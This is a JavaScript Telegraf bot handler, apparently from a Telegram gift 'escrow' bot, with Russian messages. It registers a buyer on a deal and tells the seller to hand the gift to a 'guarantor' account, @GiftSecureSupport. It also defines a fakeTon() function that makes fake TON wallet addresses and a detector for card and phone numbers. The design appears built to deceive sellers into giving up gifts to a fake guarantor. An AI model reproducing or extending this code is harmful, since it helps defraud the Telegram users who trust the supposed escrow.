import db from '../db.js'
import { Input } from 'telegraf'
import { sellerGiftStep1Kb } from '../keyboards.js'

function fakeTon() {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
  let s = 'UQ'
  for (let i = 0; i < 46; i++) s += alphabet[Math.floor(Math.random()*alphabet.length)]
  return s
}
function detectRubType(val = '') {
  const v = (val || '').replace(/\s+/g, '')
  const looksCard = /^\d{16,19}$/.test(v)
  const looksPhone = /^(\+7|7|8)\d{10}$/.test(v)
  return looksCard ? 'card' : (looksPhone ? 'phone' : null)
}

export default async (ctx) => {
  const token = ctx.startPayload
  if (!token || token.length < 6) return ctx.reply('Откройте меню: /start')

  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')

  // продавец по своей ссылке — ничего
  if (deal.sellerId === ctx.from.id) return

  // зарегистрируем покупателя и уведомим продавца (только 1 раз)
  if (!deal.buyerId) {
    deal.buyerId = ctx.from.id
    deal.log ||= []
    deal.log.push(`Покупатель @${ctx.from.username || ctx.from.id} присоединился.`)
    await db.write()
    try {
      await ctx.telegram.sendMessage(
        deal.sellerId,
        `👤 @${ctx.from.username || ctx.from.id} присоединился к сделке ${deal.code}.`
      )
      await ctx.telegram.sendMessage(
        deal.sellerId,
        `Теперь отправьте подарок гаранту @GiftSecureSupport и действуйте по шагам.`,
        sellerGiftStep1Kb(deal.token)
      )
    } catch {}
  }

  // покупателю стартовый экран (ждём действий продавца)
  const caption =
`✅ Вы присоединились к сделке.
Ожидайте действий продавца. Когда продавец отправит подарок — продолжим.`
  try {
    await ctx.replyWithPhoto(
      Input.fromLocalFile(process.cwd() + '/src/assets/logo.png'),
      { caption, parse_mode: 'Markdown' }
    )
  } catch {
    await ctx.reply(caption, { parse_mode: 'Markdown' })
  }
}